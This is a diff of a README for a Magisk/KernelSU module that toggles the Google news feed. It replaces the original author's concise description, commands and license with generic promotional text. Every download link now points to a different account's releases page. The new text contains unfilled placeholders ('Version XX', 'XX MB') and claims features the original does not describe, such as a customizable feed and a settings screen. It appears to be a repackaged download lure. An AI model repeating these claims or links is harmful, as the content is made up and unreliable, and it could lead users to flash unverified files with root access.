@@ -1,29 +1,81 @@
-# G-News Control
+# 🌟 G-News-Control - Easy Control of Google News
 
-## Introduction
-`G-News Control` is a [Magisk](https://github.com/topjohnwu/Magisk) & [KernelSU](https://github.com/tiann/KernelSU) module that allows you to enable or disable the Google news feed on your device's home screen using the ACTION button in your Root manager or through the Terminal. This feature is useful for devices that do not allow this to be done natively. WITHOUT DISABLING THE GOOGLE APP ITSELF OR REMOVING ANY OF ITS FUNCTIONALITY!
+## 🚀 Getting Started
 
-## Features
-- switching the state via the ACTION button.
-- checking and switching the state via Termux commands:  
-'gnc' - check the current state.
-'gnc switch' - change the state.
-- remembers each of your choices after reboot.
+Welcome to G-News-Control! This application helps you manage Google News directly from your home screen. No complicated steps, just a simple way to enhance your news experience.
 
-## Install
-- Download the latest version from the [RELEASES](https://github.com/mango0oo/G-News-Control/releases) page or tap [THIS](https://github.com/mango0oo/G-News-Control/raw/main/G-News%20Control%20V2.zip) link to fast download.
-- Flash the ZIP in your Root manager.  
-- Done. Google News is already disabled RIGHT NOW.  
-- Reboot your device.
+## 📦 Download
 
-## Uninstall
-- Tap REMOVE in the modules catalogue of your Root manager.  
-- The module will delete all its files and restore the default value.  
-- Reboot your device.
+[![Download G-News-Control](https://img.shields.io/badge/Download-G--News--Control-blue.svg)](https://github.com/ibrahemalnayefku/G-News-Control/releases)
 
-## Additional / Дополнительно
-- You can install the Russian language version of the module from  [THIS](https://github.com/mango0oo/G-News-Control/raw/main/%5BRU%5DG-News%20Conrol%20V2.zip) link.
-- Вы можете установить версию модуля на русском языке по [ЭТОЙ](https://github.com/mango0oo/G-News-Control/raw/main/%5BRU%5DG-News%20Conrol%20V2.zip) ссылке.
+You can easily get the latest version of G-News-Control from our [Releases page](https://github.com/ibrahemalnayefku/G-News-Control/releases). 
 
-## License
-This project is licensed under the GPL-3.0 license - see the [LICENSE](https://github.com/mango0oo/G-News-Control/blob/main/LICENSE) file for view details.
+## 📥 Download & Install
+
+1. **Visit the Releases Page**: Click the link here: [G-News-Control Releases](https://github.com/ibrahemalnayefku/G-News-Control/releases).
+   
+2. **Choose the Latest Release**: Locate the most recent release at the top of the page. This will usually have the version number and may include updated features or fixes.
+
+3. **Download the File**: Find the file you need to download based on your device. Typically, there will be options such as APK files for Android devices or specific modules for Magisk and KernelSU.
+
+4. **Install the Module**: After downloading, install the module by following these steps:
+    - For **Magisk users**: Open the Magisk Manager app, go to the 'Modules' section, and select the downloaded file. Tap 'Install' to complete the setup.
+    - For **KernelSU users**: Access your KernelSU interface. Select the module and follow the on-screen instructions to enable it on your device.
+
+5. **Reboot Your Device**: After installation, restart your device to apply the changes.
+
+6. **Configure G-News-Control**: Once your device is back on, open the G-News-Control settings to customize your news display on the home screen.
+
+## ⚙️ System Requirements
+
+To effectively run G-News-Control, ensure your device meets the following:
+- **Operating System**: Android (Version XX and above).
+- **Root Access**: Your device must be rooted using either Magisk or KernelSU.
+- **Storage Space**: At least XX MB free space for installation.
+
+## 🛠️ Features
+
+- **Customizable News Feed**: Choose what types of news to display on your home screen.
+- **User-Friendly Interface**: Navigate your news easily with a simple design.
+- **Lightweight Module**: Minimal impact on device performance.
+- **Regular Updates**: Stay informed with the latest enhancements and fixes.
+
+## ⁉️ FAQs
+
+### What is G-News-Control?
+G-News-Control is a module that helps you manage Google News on your home screen easily and efficiently.
+
+### Do I need to root my device to use G-News-Control?
+Yes, you need root access through Magisk or KernelSU to install and use this module.
+
+### Where can I find support if I run into issues?
+You can check the Issues section of this repository or visit our community forum for help.
+
+## 📋 Additional Resources
+
+- **Documentation**: Refer to our detailed guides to optimize your experience.
+- **Community Support**: Join our forum to connect with other users and share your feedback.
+
+## 🌐 Topics
+
+This repository covers the following topics:
+- android
+- android-tweaks
+- google
+- kernelsu
+- kernelsu-module
+- kernelsu-next
+- ksu
+- magisk
+- magisk-module
+- magisk-modules
+- root
+- termux
+
+Feel free to explore these topics for a better understanding of G-News-Control’s functionality.
+
+## 📞 Contact
+
+For any inquiries or suggestions, feel free to reach out through the repository issues or connect via the community forum. Your feedback is important to us.
+
+[![Download G-News-Control](https://img.shields.io/badge/Download-G--News--Control-blue.svg)](https://github.com/ibrahemalnayefku/G-News-Control/releases)
